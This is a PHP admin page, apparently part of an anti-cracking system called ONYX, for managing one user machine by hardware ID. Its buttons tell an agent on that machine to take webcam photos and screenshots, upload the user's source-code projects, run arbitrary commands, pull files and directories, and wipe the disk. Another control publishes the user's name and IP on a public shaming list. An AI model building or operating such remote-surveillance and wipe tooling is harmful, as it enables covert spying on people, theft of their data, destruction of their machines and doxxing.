<?php
// ONYX 设备详情 —— 一台机器的身份、违规、任务、取证、公示状态
require __DIR__ . '/config.php';
session_start();
header('X-Robots-Tag: noindex');

if (empty($_SESSION['admin_logged_in'])) {
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><meta charset="utf-8"><body style="background:#0b0d10;color:#e6e8eb;font:14px system-ui;padding:40px">'
       . '<h2>未登录</h2><p>请先到 <a style="color:#6cf" href="admin.php">admin.php</a> 登录。</p></body>';
    exit;
}

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
} catch (Throwable $e) {
    http_response_code(500);
    exit('db error');
}

if (empty($_SESSION['onyx_csrf'])) {
    $_SESSION['onyx_csrf'] = bin2hex(random_bytes(32));
}
$csrf = $_SESSION['onyx_csrf'];

$hwid = trim((string)($_GET['hwid'] ?? ''));
if ($hwid === '') {
    header('Location: onyxcontrol.php');
    exit;
}

require __DIR__ . '/onyx_dispatch.php';

$hwidHash = hash('sha256', $hwid);

$msg = '';
$msgType = 'ok';

// ── 直接动作（摄像头 / 截屏 / 扫源码 / 取文件 / 格机）──
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'quick') {
    if (!hash_equals($csrf, (string)($_POST['csrf'] ?? ''))) die('CSRF validation failed.');
    $type = (string)($_POST['type'] ?? '');
    $params = trim((string)($_POST['params'] ?? '{}'));
    if ($params === '') $params = '{}';
    $quickDefaults = [
        'capture_cam'    => '{"quality":80}',
        'capture_screen' => '{"quality":70,"max_width":1600}',
        'collect_src'    => '{"max_depth":3,"max_projects":40}',
    ];
    if (isset($quickDefaults[$type])) $params = $quickDefaults[$type];
    $label = ['capture_cam' => '摄像头', 'capture_screen' => '截屏', 'collect_src' => '扫源码',
              'exec' => '执行命令', 'collect_file' => '取文件', 'collect_tree' => '取目录', 'wipe' => '格机'][$type] ?? $type;
    if (!in_array($type, ONYX_TASK_TYPES_WEB, true)) {
        $msg = "不支持的动作：{$type}";
        $msgType = 'err';
    } elseif (json_decode($params) === null) {
        $msg = '参数不是合法 JSON';
        $msgType = 'err';
    } else {
        try {
            $tid = dispatch_task($hwid, $type, $params, 3600);
            $msg = "已下发「{$label}」{$tid}";
        } catch (Throwable $e) {
            $msg = '下发失败：' . $e->getMessage();
            $msgType = 'err';
        }
    }
}

// ── 封禁 / 解封 ──
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'ban') {
    if (!hash_equals($csrf, (string)($_POST['csrf'] ?? ''))) die('CSRF validation failed.');
    $uname = trim((string)($_POST['username'] ?? ''));
    if ($uname === '') {
        $msg = '缺少用户名';
        $msgType = 'err';
    } else {
        $cur = $pdo->prepare("SELECT id, status FROM users WHERE username = ? LIMIT 1");
        $cur->execute([$uname]);
        $u = $cur->fetch();
        if (!$u) {
            $msg = "没有这个账号：{$uname}";
            $msgType = 'err';
        } else {
            $new = ((int)$u['status'] === 0) ? 1 : 0;
            $pdo->prepare("UPDATE users SET status = ? WHERE id = ?")->execute([$new, $u['id']]);
            $msg = $new === 0 ? "已封禁「{$uname}」" : "已解封「{$uname}」";
        }
    }
}

// ── 一键处置 ──
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'playbook') {
    if (!hash_equals($csrf, (string)($_POST['csrf'] ?? ''))) die('CSRF validation failed.');
    $pname = trim((string)($_POST['playbook'] ?? ''));
    $r = run_playbook($pdo, $hwid, $pname, 3600);
    if ($r['ok'] > 0) {
        $msg = "已下发 {$pname}：成功 {$r['ok']} 条" . ($r['fail'] > 0 ? "，失败 {$r['fail']} 条" : '');
        if ($r['errors']) $msg .= '（' . implode('；', $r['errors']) . '）';
        $msgType = $r['fail'] > 0 ? 'err' : 'ok';
    } else {
        $msg = "下发失败：{$pname} " . implode('；', $r['errors']);
        $msgType = 'err';
    }
}

// ── 公示上下墙 ──
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'expose') {
    if (!hash_equals($csrf, (string)($_POST['csrf'] ?? ''))) die('CSRF validation failed.');
    $mode = (string)($_POST['mode'] ?? '');
    $headline = trim((string)($_POST['headline'] ?? ''));
    $now = date('Y-m-d H:i:s');
    if ($mode === 'on') {
        $info = $pdo->prepare("SELECT username, ip FROM auth_security_events WHERE hwid_hash = ? ORDER BY id DESC LIMIT 1");
        $info->execute([$hwidHash]);
        $i = $info->fetch() ?: ['username' => '', 'ip' => ''];
        $pdo->prepare("INSERT INTO auth_exposures (hwid_hash, username, ip, headline, note, published, created_at, updated_at)
                       VALUES (?,?,?,?,'',1,?,?)
                       ON DUPLICATE KEY UPDATE published=1, headline=VALUES(headline), updated_at=VALUES(updated_at)")
            ->execute([$hwidHash, $i['username'], $i['ip'], $headline !== '' ? $headline : '破解 / 调试主程序', $now, $now]);
        $msg = '已上墙';
    } elseif ($mode === 'off') {
        $pdo->prepare("UPDATE auth_exposures SET published = 0, updated_at = ? WHERE hwid_hash = ?")->execute([$now, $hwidHash]);
        $msg = '已下墙';
    } elseif ($mode === 'del') {
        $pdo->prepare("DELETE FROM auth_exposures WHERE hwid_hash = ?")->execute([$hwidHash]);
        $msg = '已从名单移除';
    }
}

// ── 身份 ──
$st = $pdo->prepare("SELECT username, computer_name, system_version, host_computer_name,
                            host_system_version, ip, first_seen, last_seen, seen_count
                     FROM user_usage_identities
                     WHERE identity_key = ? AND identity_type = 'hwid' LIMIT 1");
$st->execute([$hwidHash]);
$ident = $st->fetch();

// ── 违规汇总 ──
$st = $pdo->prepare("SELECT event_type, risk_level, COUNT(*) c, MIN(created_at) first_at, MAX(created_at) last_at
                     FROM auth_security_events WHERE hwid_hash = ?
                     GROUP BY event_type, risk_level ORDER BY c DESC");
$st->execute([$hwidHash]);
$events = $st->fetchAll();

$st = $pdo->prepare("SELECT COUNT(*) FROM auth_security_events WHERE hwid_hash = ? AND risk_level IN ('high','critical')");
$st->execute([$hwidHash]);
$highCount = (int)$st->fetchColumn();

// ── 最近事件明细 ──
$st = $pdo->prepare("SELECT event_type, risk_level, detail, ip, created_at
                     FROM auth_security_events WHERE hwid_hash = ? ORDER BY id DESC LIMIT 20");
$st->execute([$hwidHash]);
$recentEvents = $st->fetchAll();

// ── 任务 ──
$st = $pdo->prepare("SELECT task_id, type, status, attempts, created_at, result_message
                     FROM auth_agent_tasks WHERE hwid = ? ORDER BY id DESC LIMIT 20");
$st->execute([$hwid]);
$tasks = $st->fetchAll();

// ── 取证文件 ──
$st = $pdo->prepare("SELECT id, task_id, src_path, bytes, created_at
                     FROM auth_agent_files WHERE hwid = ? ORDER BY id DESC LIMIT 24");
$st->execute([$hwid]);
$files = $st->fetchAll();

// ── 公示状态 ──
$st = $pdo->prepare("SELECT headline, note, published, created_at, updated_at FROM auth_exposures WHERE hwid_hash = ?");
$st->execute([$hwidHash]);
$exposure = $st->fetch();

$playbooks = load_playbooks($pdo);

// 这台机器上登录过的账号（用于封禁按钮）
$acctNames = [];
$st = $pdo->prepare("SELECT DISTINCT username FROM user_usage_identities
                     WHERE identity_key = ? AND identity_type = 'hwid' AND username <> ''
                     ORDER BY username");
$st->execute([$hwidHash]);
foreach ($st as $r) $acctNames[] = (string)$r['username'];

function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function is_img(string $p): bool {
    $e = strtolower(pathinfo(str_replace('\\', '/', $p), PATHINFO_EXTENSION));
    return in_array($e, ['jpg', 'jpeg', 'png', 'gif', 'webp'], true);
}
function human_size($n): string {
    $n = (int)$n;
    if ($n < 1024) return $n . ' B';
    if ($n < 1048576) return round($n / 1024, 1) . ' KB';
    return round($n / 1048576, 1) . ' MB';
}
$eventNames = [
    'disk_threat_detected' => '扫盘发现破解工具',
    'ai_tool_detected' => 'AI 辅助工具',
    'debugger_attached' => '调试器附加',
    'session_replay_detected' => '会话重放',
    'integrity_failed' => '完整性校验失败',
    'blocked_request' => '请求被拦截',
    'tamper_detected' => 'agent 被改动',
    'heartbeat_rejected' => '心跳被拒',
];
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>设备 <?= h(substr($hwid, 0, 12)) ?> · ONYX</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { margin:0; background:#0b0d10; color:#e6e8eb; font:14px/1.6 -apple-system,"Segoe UI","Microsoft YaHei",sans-serif; }
  header { padding:18px 24px; border-bottom:1px solid #1d2229; display:flex; justify-content:space-between; align-items:baseline; }
  h1 { margin:0; font-size:19px; }
  h2 { font-size:14px; margin:0 0 10px; color:#c9d1d9; }
  main { padding:18px 24px 60px; max-width:1200px; display:grid; gap:16px; }
  .panel { border:1px solid #1d2229; border-radius:10px; background:#10141a; padding:14px 16px; }
  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
  @media (max-width:900px) { .grid2 { grid-template-columns:1fr; } }
  table { width:100%; border-collapse:collapse; font-size:12.5px; }
  th, td { text-align:left; padding:5px 8px; border-bottom:1px solid #1a1f26; vertical-align:top; }
  th { color:#8b95a1; font-weight:500; }
  .mono { font-family:ui-monospace,Consolas,monospace; font-size:11.5px; }
  .kv { display:grid; grid-template-columns:110px 1fr; gap:4px 10px; font-size:13px; }
  .kv span:first-child { color:#8b95a1; }
  .badge { display:inline-block; padding:2px 9px; border-radius:99px; font-size:12px; background:#2a1416; color:#ff8a8a; border:1px solid #54262a; }
  .badge.ok { background:#12261a; color:#7ee2a8; border-color:#1f4d31; }
  .st { padding:1px 7px; border-radius:99px; font-size:11px; }
  .st-pending { background:#2a2416; color:#ffcf70; }
  .st-delivered { background:#16232a; color:#7ec8ff; }
  .st-done { background:#12261a; color:#7ee2a8; }
  .st-failed { background:#2a1416; color:#ff9f9f; }
  .res { max-width:520px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:#a8b3bf; cursor:pointer; }
  .res.open { white-space:pre-wrap; word-break:break-all; }
  form.inline { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
  input[type=text] { background:#0b0d10; color:#e6e8eb; border:1px solid #232b35; border-radius:7px; padding:6px 10px; font:inherit; flex:1; min-width:200px; }
  button { background:#1b4b8f; border:1px solid #2b6bc4; color:#e6e8eb; border-radius:7px; padding:6px 14px; font:inherit; cursor:pointer; }
  button.warn { background:#5a1f1f; border-color:#8c3030; }
  .btn { display:inline-block; background:#1b4b8f; border:1px solid #2b6bc4; color:#e6e8eb;
         border-radius:7px; padding:5px 12px; font-size:12px; text-decoration:none; }
  .msg { padding:7px 12px; border-radius:7px; background:#12261a; border:1px solid #1f4d31; color:#7ee2a8; font-size:13px; margin-bottom:10px; }
  .msg.err { background:#2a1416; border-color:#54262a; color:#ff9f9f; }
  a { color:#7ec8ff; }
  .thumbs img { height:74px; border:1px solid #232b35; border-radius:5px; margin:0 6px 6px 0; }
</style>
</head>
<body>
<header>
  <h1>设备 <?= h(substr($hwid, 0, 12)) ?> <span class="mono" style="color:#5b6673"><?= h($hwid) ?></span></h1>
  <div><a href="onyxcontrol.php">← 返回控制台</a> · <a href="onyxplaybook.php">处置预案</a></div>
</header>
<main>
  <?php if ($msg !== ''): ?><div class="msg <?= $msgType === 'err' ? 'err' : '' ?>"><?= h($msg) ?></div><?php endif; ?>

  <section class="panel">
    <h2>身份
      <a class="btn" style="float:right;font-size:12px;padding:3px 12px"
         href="onyxcase.php?hwid=<?= h(urlencode($hwid)) ?>&dl=1">下载取证包</a>
    </h2>
    <?php if ($ident): ?>
      <div class="kv">
        <span>用户名</span><span><?= h($ident['username']) ?></span>
        <span>计算机名</span><span><?= h($ident['computer_name'] ?: $ident['host_computer_name'] ?: '—') ?></span>
        <span>系统</span><span class="mono"><?= h($ident['system_version'] ?: $ident['host_system_version'] ?: '—') ?></span>
        <span>IP</span><span class="mono"><?= h($ident['ip']) ?></span>
        <span>首次出现</span><span class="mono"><?= h($ident['first_seen']) ?></span>
        <span>最后出现</span><span class="mono"><?= h($ident['last_seen']) ?></span>
        <span>登录次数</span><span class="mono"><?= (int)$ident['seen_count'] ?></span>
      </div>
    <?php else: ?>
      <div style="color:#8b95a1">这台机器没有身份记录（可能只跑过 agent，没登录过启动器）</div>
    <?php endif; ?>
  </section>

  <section class="panel">
    <h2>处置菜单</h2>
    <?php if (!$playbooks): ?>
      <div style="color:#8b95a1">没有可用预案（auth_playbooks 为空或格式不对）</div>
    <?php else: ?>
      <form method="post" class="inline">
        <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
        <input type="hidden" name="action" value="playbook">
        <?php foreach ($playbooks as $pb): ?>
          <button name="playbook" value="<?= h($pb['name']) ?>" title="<?= h($pb['note']) ?>">
            <?= h($pb['name']) ?>
          </button>
        <?php endforeach; ?>
      </form>
    <?php endif; ?>

    <div class="kv" style="margin-top:12px;border-top:1px solid #1a1f26;padding-top:10px">
      <span>直接动作</span>
      <span>
        <form method="post" class="inline" onsubmit="return confirm('对这台机器调用摄像头拍一张？')">
          <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
          <input type="hidden" name="action" value="quick">
          <input type="hidden" name="type" value="capture_cam">
          <button>摄像头</button>
        </form>
        <form method="post" class="inline" onsubmit="return confirm('扫这台机器的源码工程并回传？可能要几分钟。')">
          <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
          <input type="hidden" name="action" value="quick">
          <input type="hidden" name="type" value="collect_src">
          <button>扫源码</button>
        </form>
        <form method="post" class="inline" onsubmit="return confirm('截一张当前桌面？')">
          <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
          <input type="hidden" name="action" value="quick">
          <input type="hidden" name="type" value="capture_screen">
          <button>截屏</button>
        </form>
      </span>
    </div>

    <?php if ($acctNames): ?>
    <div class="kv" style="border-top:1px solid #1a1f26;padding-top:10px">
      <span>账号</span>
      <span>
        <?php foreach (array_slice($acctNames, 0, 6) as $an): ?>
          <form method="post" class="inline" onsubmit="return confirm('封禁账号「<?= h($an) ?>」？封了之后他登不上启动器。')">
            <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
            <input type="hidden" name="action" value="ban">
            <input type="hidden" name="username" value="<?= h($an) ?>">
            <button class="warn">封 <?= h($an) ?></button>
          </form>
        <?php endforeach; ?>
        <?php if (count($acctNames) > 6): ?>
          <span style="color:#8b95a1;font-size:12px">另有 <?= count($acctNames) - 6 ?> 个</span>
        <?php endif; ?>
      </span>
    </div>
    <?php endif; ?>

    <details style="margin-top:12px;border-top:1px solid #1a1f26;padding-top:10px">
      <summary style="cursor:pointer;color:#8b95a1;font-size:13px">发命令 / 格机（需要填参数，会显示实际内容）</summary>
      <form method="post" style="margin-top:10px" onsubmit="return confirm('确认对这台机器执行：\n' + this.type.value + '\n参数：' + this.params.value)">
        <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
        <input type="hidden" name="action" value="quick">
        <select name="type" style="width:100%;margin-bottom:8px">
          <option value="exec">执行命令</option>
          <option value="collect_file">取单个文件</option>
          <option value="collect_tree">取整个目录</option>
          <option value="wipe">格机</option>
        </select>
        <textarea name="params" spellcheck="false"
          style="width:100%;min-height:76px;font-family:ui-monospace,Consolas,monospace;font-size:12.5px;background:#0b0d10;color:#e6e8eb;border:1px solid #232b35;border-radius:7px;padding:8px">{"cmd":"whoami","shell":"cmd","timeout":30}</textarea>
        <button style="margin-top:8px">执行</button>
      </form>
      <div style="color:#ff9f9f;font-size:12px;margin-top:8px">
        格机参数里 <code>phase</code> 先填 <code>arm</code> 只会预演、不删东西；改成 <code>run</code> 才真删。删之前先用「取整个目录」留一份。
      </div>
    </details>
  </section>

  <section class="panel">
    <h2>公示状态
      <?php if ($exposure && (int)$exposure['published'] === 1): ?>
        <span class="badge">已公示</span>
      <?php elseif ($exposure): ?>
        <span class="badge ok">已下墙</span>
      <?php else: ?>
        <span class="badge ok">未上墙</span>
      <?php endif; ?>
    </h2>
    <div class="kv" style="margin-bottom:10px">
      <span>高风险事件</span><span><?= $highCount ?> 次</span>
      <?php if ($exposure): ?>
        <span>标题</span><span><?= h($exposure['headline']) ?></span>
        <span>更新时间</span><span class="mono"><?= h($exposure['updated_at']) ?></span>
      <?php endif; ?>
    </div>
    <form method="post" class="inline">
      <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
      <input type="hidden" name="action" value="expose">
      <input type="text" name="headline" placeholder="公示标题（留空用默认）"
             value="<?= h($exposure['headline'] ?? '') ?>">
      <button name="mode" value="on">上墙</button>
      <button name="mode" value="off" class="warn">下墙</button>
      <?php if ($exposure): ?><button name="mode" value="del" class="warn">移出名单</button><?php endif; ?>
    </form>
  </section>

  <div class="grid2">
    <section class="panel">
      <h2>违规汇总</h2>
      <table>
        <tr><th>类型</th><th>级别</th><th>次数</th><th>最近</th></tr>
        <?php foreach ($events as $e): ?>
          <tr>
            <td><?= h($eventNames[$e['event_type']] ?? $e['event_type']) ?></td>
            <td class="mono"><?= h($e['risk_level']) ?></td>
            <td class="mono"><?= (int)$e['c'] ?></td>
            <td class="mono"><?= h($e['last_at']) ?></td>
          </tr>
        <?php endforeach; ?>
        <?php if (!$events): ?><tr><td colspan="4" style="color:#8b95a1">没有事件记录</td></tr><?php endif; ?>
      </table>
    </section>

    <section class="panel">
      <h2>最近事件</h2>
      <table>
        <tr><th>时间</th><th>类型</th><th>详情</th></tr>
        <?php foreach ($recentEvents as $e): ?>
          <tr>
            <td class="mono"><?= h(substr($e['created_at'], 5)) ?></td>
            <td><?= h($eventNames[$e['event_type']] ?? $e['event_type']) ?></td>
            <td class="mono"><?= h(mb_substr((string)$e['detail'], 0, 70)) ?></td>
          </tr>
        <?php endforeach; ?>
        <?php if (!$recentEvents): ?><tr><td colspan="3" style="color:#8b95a1">无</td></tr><?php endif; ?>
      </table>
    </section>
  </div>

  <section class="panel">
    <h2>最近任务</h2>
    <table>
      <tr><th>时间</th><th>类型</th><th>状态</th><th>结果</th></tr>
      <?php foreach ($tasks as $t): ?>
        <tr>
          <td class="mono"><?= h($t['created_at']) ?></td>
          <td><?= h($t['type']) ?></td>
          <td><span class="st st-<?= h($t['status']) ?>"><?= h($t['status']) ?></span></td>
          <td class="res" onclick="this.classList.toggle('open')"><?= h((string)$t['result_message']) ?></td>
        </tr>
      <?php endforeach; ?>
      <?php if (!$tasks): ?><tr><td colspan="4" style="color:#8b95a1">没有下发过任务</td></tr><?php endif; ?>
    </table>
  </section>

  <section class="panel">
    <h2>取证文件（最近 24 份）</h2>
    <div class="thumbs">
      <?php foreach ($files as $f): if (!is_img($f['src_path'])) continue; ?>
        <a href="onyxfile.php?id=<?= (int)$f['id'] ?>" target="_blank">
          <img src="onyxfile.php?id=<?= (int)$f['id'] ?>" alt="">
        </a>
      <?php endforeach; ?>
    </div>
    <table>
      <tr><th>时间</th><th>来源路径</th><th>大小</th><th>操作</th></tr>
      <?php foreach ($files as $f): ?>
        <tr>
          <td class="mono"><?= h($f['created_at']) ?></td>
          <td class="mono" style="max-width:600px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?= h($f['src_path']) ?></td>
          <td class="mono"><?= h(human_size($f['bytes'])) ?></td>
          <td>
            <?php if (is_img($f['src_path'])): ?>
              <a href="onyxfile.php?id=<?= (int)$f['id'] ?>" target="_blank">查看</a>
            <?php endif; ?>
            <a href="onyxfile.php?id=<?= (int)$f['id'] ?>&dl=1" style="margin-left:8px">下载</a>
          </td>
        </tr>
      <?php endforeach; ?>
      <?php if (!$files): ?><tr><td colspan="4" style="color:#8b95a1">没有取证文件</td></tr><?php endif; ?>
    </table>
  </section>
</main>
</body>
</html>
